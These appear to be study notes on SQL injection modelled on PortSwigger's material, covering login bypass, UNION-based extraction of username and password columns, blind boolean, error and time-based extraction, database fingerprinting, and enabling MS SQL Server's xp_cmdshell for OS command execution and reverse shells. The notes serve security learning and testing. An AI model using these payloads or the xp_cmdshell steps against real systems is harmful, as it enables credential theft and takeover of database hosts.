`## SQL Injection
https://portswigger.net/web-security/sql-injection/cheat-sheet

- **What:** Attacker injects SQL code into the application’s database queries. This can read, modify, or delete data that the app can access, bypassing normal constraints.
    
- **Impact:** Steal user data (password hashes, PII, credit cards), modify or drop tables, or even execute commands if the DB supports it. Many major breaches have involved SQLi.
    
- **Common payloads:**
    
    - **Login bypass:** `admin' OR '1'='1' --` in a login field to force the condition true.
        
    - **Data retrieval:** `' UNION SELECT username, password FROM users --`.
        
    - **Boolean testing:** append `
	` vs `' OR 1=2; --` to observe differences.
        
    - **Error-based:** Inject invalid SQL to elicit errors (like `'` causing syntax error).
        
    - **Blind (time-based):** `' OR IF(1=1,SLEEP(5),0) --` to see a delayed response.
        
- **Detection:** Try a single quote (`'`) or known payloads (`OR 1=1 --`) on all inputs. Observe SQL errors or changes in output. PortSwigger suggests testing `'`, `OR 1=1`, `OR 1=2`, and payloads that cause delays.
- **Prevention:** Use parameterized queries (prepared statements) or ORM query builders. Never directly concatenate user input into SQL strings.

# Detailed documentation
## Detection
- **Manual testing**:
    - Insert single quote `'`; look for errors.
    - Test boolean logic: `OR 1=1` vs `OR 1=2`.
    - Time-based payloads: delays to notice slow responses.
    - OAST payloads: trigger out‑of‑band interactions.
- **Automation**: Use Burp Scanner for rapid scanning.

## Attack types
### 1. Retrieving hidden data
- Inject comment to remove conditions:
    - `…?category=Gifts'--` drops `AND released = 1`, revealing unreleased items. 

### 2. UNION-based data exfiltration
- Use `UNION SELECT` to merge attacker-selected rows.    
- Steps:
    1. Determine column count using `ORDER BY` or `UNION SELECT NULL...`.
    2. Find which columns accept strings.
    3. Inject:
        `' UNION SELECT username,password FROM users--` 

### 3. Blind SQL Injection
- When no direct data output:
    - **Boolean-based**: compare conditions to infer data:
        `' AND SUBSTRING((SELECT password FROM Users WHERE username='Administrator'),1,1)>'m`
        Repeat until resolved. 
    - **Error-based**: use errors to leak data:
        `SELECT CAST((SELECT password FROM users LIMIT 1) AS int)`    
    - **Time-based**:
        `'…' OR pg_sleep(10)--` 
        Observe 10s delay. 
    - **Out-of-band (OAST)**: trigger DNS/HTTP to exfiltrate.

### Database Recon
- Query version:
    - SQL Server/MySQL: `SELECT @@version`
    - PostgreSQL: `SELECT version()`
    - Oracle: `SELECT * FROM v$version`
- Inspect schema:
    - `information_schema.tables` → list tables.
    - `information_schema.columns WHERE table_name='X'` → columns.

## **SQL Injection UNION Attacks**

- **Definition:**  
    A SQL injection UNION attack exploits vulnerable applications that return SQL query results in their responses by using the `UNION` keyword to combine results from additional queries and extract data from other database tables.
- **How UNION Works:**  
    `UNION` allows appending results from one or more `SELECT` queries to the original query's result set, e.g.,
    `SELECT a, b FROM table1 UNION SELECT c, d FROM table2`
- **Requirements for UNION Injection:**
    1. Both queries must return the same _number_ of columns.
    2. Corresponding columns must have _compatible data types_.
- **Step 1: Determine Number of Columns Returned by Original Query**  
    Two techniques:
    - Use incremental `ORDER BY` clauses to find when the column index causes an error.
    - Use `UNION SELECT` payloads with varying numbers of `NULL`s until no error occurs (`NULL` is compatible with many data types)
- **Step 2: Identify Columns That Can Hold String Data**  
    Test each column by injecting a string like `'a'` into it via `UNION SELECT 'a', NULL, ...--` payloads.  
    A data type mismatch (e.g., trying to put a string into an integer column) triggers an error.
- **Step 3: Extract Data**  
    Once number of columns and string columns are known, inject statements like:
    `' UNION SELECT username, password FROM users--`
    to retrieve sensitive data.
- **Concatenating Multiple Values in One Column:**  
    When only one column is returned, use string concatenation to combine fields, e.g. on Oracle:
    `' UNION SELECT username || '~' || password FROM users--`
- **Database-Specific Details:**
    - Oracle requires a `FROM DUAL` clause for `SELECT` with no table.
    - MySQL comments need a space after `--`.

## **Blind SQL Injection**

- **Definition:**  
    Blind SQL injection occurs when the application is vulnerable, but its responses do not disclose query results or detailed error messages, restricting ability to see immediate output from injected queries.
- **Why UNION Attacks Fail Here:**  
    `UNION` attacks rely on visible results in responses, which blind SQL injection does not expose.
- **Technique: Using Conditional Responses**  
    Exploit differences in application behavior by injecting boolean conditions that alter the response in some detectable way.  
    Example with tracking cookie:
    `TrackingId=xyz' AND '1'='1  # condition true: app responds "Welcome back" TrackingId=xyz' AND '1'='2  # condition false: no welcome message`
- **Character-by-Character Extraction:**  
    Use conditions on values to infer data one character at a time using SQL functions like `SUBSTRING` or `SUBSTR`.  
    Example to extract password's first character:
    `xyz' AND SUBSTRING((SELECT Password FROM Users WHERE Username='Admin'), 1, 1) > 'm`
    Adjust character guesses until condition matches.
- **Error-Based Blind SQL Injection:**  
    Some blind SQL exploits leverage causing database errors conditionally, e.g., divide-by-zero, to distinguish true/false conditions by different application responses.  
    Example:
    `xyz' AND (SELECT CASE WHEN (condition) THEN 1/0 ELSE 'a' END)='a`
- **Verbose Error Messages:**  
    Occasionally, misconfigurations expose detailed SQL errors revealing query structure and aiding injection construction.
    

These notes cover the **core methods, techniques, and considerations** for both types of SQL injection attacks, useful for understanding vulnerabilities, exploitation strategies, and database-specific nuances.

# SQLi / MS SQL Server RCE / Database Exploitation

---
## **Key Concept:**

- `xp_cmdshell` is a **built-in extended stored procedure** in MS SQL Server.
- It allows you to **execute arbitrary OS commands** directly from SQL queries.
- If enabled, it’s a **direct way to get a shell-like access** on the underlying Windows host.
    

---

## **Usage / Syntax**

```sql
-- Execute a single command
xp_cmdshell 'whoami';

-- Execute multiple commands (use GO to terminate batch)
xp_cmdshell 'dir C:\';
GO
```

- `GO` = batch separator for SQL Server Management Studio (SSMS) or `sqlcmd`.
- Typical commands:
    - `whoami`, `ipconfig`, `net user` → info gathering
    - `powershell -c "..."` → download & execute payloads
    - `cmd.exe /c ...` → run batch commands

---

## **Pre-requisites**

- SQL user must have **sysadmin privileges**, otherwise `xp_cmdshell` may be disabled.
- If disabled, you can try:

```sql
-- Enable xp_cmdshell
EXEC sp_configure 'show advanced options', 1;
RECONFIGURE;
EXEC sp_configure 'xp_cmdshell', 1;
RECONFIGURE;
GO
```

---

## **Post-Exploitation / Shell**

- Once xp_cmdshell works, you essentially have a **limited Windows shell**.
- You can then pivot to:
    - Upload/download files
    - Run scripts
    - Spawn a reverse shell with `powershell` or `nc.exe`

---